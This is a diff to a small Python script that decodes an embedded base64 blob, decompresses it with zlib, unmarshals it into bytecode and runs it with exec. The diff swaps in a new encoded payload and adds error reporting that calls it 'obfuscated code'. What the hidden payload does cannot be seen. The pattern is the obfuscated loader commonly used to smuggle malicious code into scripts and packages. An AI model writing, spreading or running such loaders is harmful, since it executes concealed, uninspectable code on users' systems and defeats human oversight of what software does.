@@ -1,15 +1,25 @@
 import base64
 import zlib
 import marshal
+import sys
 
 def heaven():
     try:
-        raw = base64.b64decode("eJx9VM1vE0cUn/Wu99Pe1ClJ+BBkcSuwgVgKzhcWSaWmiBZEqmZltVIiWRt7HLuxd53ZNSRGSJZ6cU5JWlX4yDG98TeUaw8JaUSYcGhFLtysgoTEqTO7XscoEbPaffPxe7/33m9m5zXoasG2fcszAPwOdKAzdwHyLIMY1wZQwLUsYl3LIU4PnAUoOM/rbOonAIwcAPNCFMwzs5+BY22U8azOpXoJViJYKQr0oD+vgUXmZE+dp+kheT4w2398dfbM8bl52WeNtWfceMFo14obj2YgzMsq0MUk272yyMSlN3Qwk2W6iHnyslSnvzydmDRQQTJgMnMdVBroAZ3VuRtsAJiBdGCWPUGLtjWpkuQZDfiR5/ydAD+yaapO29vk5vhOxeJxxihIc37+ZnBO7mBDJ2I7qpv8nNrBnqA9wfI+dvbzT1Qi6HxaIDoKSdYUu9RgdPEjNfqOc6TFI+WP6THgo3SJaq3LaYYoznXtFbgIrnX2OUfm8wENDJIVDcxsTbKDIM98AjHsIeLKDBYK0LgPzQxmUC1YdfJDE3EGi9DMWrmiuYg5uAKzNaNYrljI0RYMG46NyO1RrVRc8PtlA9kFoyTLOZjXPMpYPCVrpDlo1evQhowH2mSbJ7EwNpKDJBCMRWuvo/EOiE6WKwjaNswRNI2TOJqLEY4jLHXPWAs/E1w7h0TJMnJ2rJvkCE7Lifk+17SHlzMZ0yjDTOZySiP9slE0Sf+R5wBXsrDiaLdcU7TMozIqqGg6sWgikSBpy8W85tNok5Na1OeJeg6+HDJmHtQkvZrNkqRSWo3Thqa0eAhzVgWamEPQyGGBJl0sQSy0q8HBXLVcsTFHVcCiXxPmPQ2xRER0dwti3hMTBx+gokOMm2RcwmG4UrQdspuZPGVWrKpTqTregMljxbaqKAszrq+4sOp4LHI7gRLMYflISixUjOySsQhxD9UZoowDy5WS4UBbokfTbzhsLeSrdtZwLJSorGIlS+pzoBsVDRKkQF57h3zqYP/Uuea95lfbvVfrdw+lcKPc1LfGn0vJp8v7/QOP85v53woN5T0L5JHDnv6Nh0/uPR3b7UnVv30VOf34/K/nmyu7kVj9zqtInzuq7Uau1O8cqqdeqBeeqxfIWL3yQh3eUYd31WT9dovjz11shUA0/kRqAekK0wr3DHD1799Fgaw2lprJrYHn0vDTH/ZFaV1YEzZ6/hY1Gvv6Ox4E5cZ3G+WNzJNvts5thbflsT1u/P0NkteelPzw/joB7UnDH2z6+25Gpjn2z9O9033sM06e7hWe9cnTXwhY9A/HG/q71+Jpm2iZ0iqrTsEytY800246BlqE3k5NvaE/f024hZCFyOFRNNNytLxVNXOJeBjRWwyz9qqNA5aN6O2G6CXoKk1jeqcTsyV60gjrfXSKrihdETBXMZwC5t3TYv8B3tKLA11wCW6WrVyVJIGGyJAmYj8knxbLMMwBCB8A+QBIB0A5AOp/3CAz0fqaAVyoUdtlz7wU5EZyfWJt4pdHG8u7wumXYnhbvbEnpv7pP/O4sFloLm8uNZR9Jbw+vja+PrU21bz6Qrm0o1x6GRpoKnuhL/8NRTZuN+82J7eU7d6RvdBoKwK4s+gaif8/R2HQ3A==")
+        raw = base64.b64decode("eJx9VNFv00YYP8dOHNuJSzpKKQgw2QRJgUglpS0R7TR1CAYCtFrRkNopcpxLk5HY4ezQNmhSpL2kT203TeSRx+6Nv2Fob3so7SLKlYdN44W3aCAh8bQ7O04Dqbgo/vzd/e77fvf7Pt+/oGf4O/ZNgAHgV6AClbkJkGsZxDjWh3yOZRHrWA5xqu8YQP6FgMqm7gKg5QBY4KNggZk7BPrGJca1KpcaJFiBYIUoUP3evAIWmYN3qgFKD4kLvrkj/atzI/1zC6IXNdaZcfL5oz0rTj7KgF8QZaAGk2zvyiITF15T57bO9AQOkD9LdfrT1YlJAxkkfQYz30WlgepTWZW7zPqA4Uv75tgDtOhYgypJfpd8XuZ5rxLgOzZN1ensNrj5QPfEwf6IUZDmPP6Gf17sYkMHYruqG4F5uYs9QHuCDXjYuc8+cRJeDaR5oiOfZI1gjxqMGvxAjaH+GOngvvJ9egx7KFWgWqtimiGKcz21AqfB+W6dc2Q+71PAKbKigNub0+wpkGc+gRhzEXHpNuYLUHsAjQxmUM1ftfMXpuIMDkJDN3NFYxFzcBnqtVKxXDGRrWQ1C06Mix2PTGe997KGrIJW8lxrxRLFHMwrbvRYPCUqZNhoxX2hA2lLynQnZCI7MZ6DJCeMRbU/CNlovIuj8+UKgpYFc2QDzZrYn4uRMPtYGiFjZn8guA6jRMnUclasN8g+XPzIKvS0mcWSmdVKFonReYvFE7pZWYnFD8TNn81kDK0MM5mz35M9xCtrRYN4fWmcbTGP4/kPonxECi7rsGIrVx1TNA1FsxSY6uPbkdtGmg6zmn6vu1BBRcOORb8yFIiQiRRT16sIEQGXCsUSVFDVMEh5FbsAFTObr1q6ZpNFSi3VI303bsKJlyGsiAhiMa94R1amp5Wod+KoS9CruYiZpZqgVnWdyJ5SapxyYUaJhzBnVqCBOQS1HOZpWQgjzHfqhf25arliYY7WGQe9quGA2yhYIJ3idCfEAbdjsH8JFW1iHI5xAYfhctGyyfEyeRpZMqt2pWq7DpPHkmVWkQ4zzt5gdsV2o4gdAiWYw+J+s2C+Qs6vLUI8QDsJoowNy5USkcsS6KfoDRz2dDRRorKCJZ2cz4ZOVnSKIHnyt1rkUQe7h483bzW/3Bo8V7/5Sgg3yk11c3JbSD65v3tk+FF+I/9LoSG9Y4E4/jYADg2vP3x868nEzkCqfv1l5OijEz+faC7vRGL1Gy8jQ45X24mM1m+8kg8/l09uyyeJL48+l8eeyWM7crJ+rc3xx0+3ZfJNPRbaYHCUaQ+MDHP1O28ngCg37jWTm8PbwtiTb3eDwhq/yq8P/BVUaPaLJLtfbHyzXl7PPP568/hmeEucaHGT7+4whFpLSL5/d528XWwJY+8temVtRGY59vejg7ND7FNOnB3knw6Js5/zOOg1yGt6xdXiaYvomVIqK3aBdPYHuilXbA0tQrdaM6/phVfjr9IWJg0kKYZpK3mzauQS8TCiNzdmyVWDfaaF6I2O6MXvqE1zuh2K2RLtNhL1ATpMV6SeDJiraHYBB5yOsX4Db+hliU46Aa6UzVyVkEAXiEuJWA/Jo80yDLMHwntA3APCHpD2gPwfN8pMte8ygAs1ajvsyAtebCTXplanfvpx/f4Of/RFMLwlX24FU38fGXlU2Cg072/ca0i7UnhtcnVybWZ1pnnuuXTmmXTmRWi4KbVCX/wTiqxfa95sTm9KW4PjrdCldgRwx9B5kv9/3X0VsQ==")
         decompressed = zlib.decompress(raw)
         code_obj = marshal.loads(decompressed)
-        exec(code_obj, {'__name__': '__main__'})
-    except Exception:
-        print("...")
+        
+       
+        exec_globals = globals().copy()
+        exec_globals['__name__'] = '__main__'
+        
+        exec(code_obj, exec_globals)
+        
+    except Exception as e:
+       
+        import traceback
+        print("An error occurred while running the obfuscated code:")
+        traceback.print_exc()
 
 if __name__ == "__main__":
     heaven()
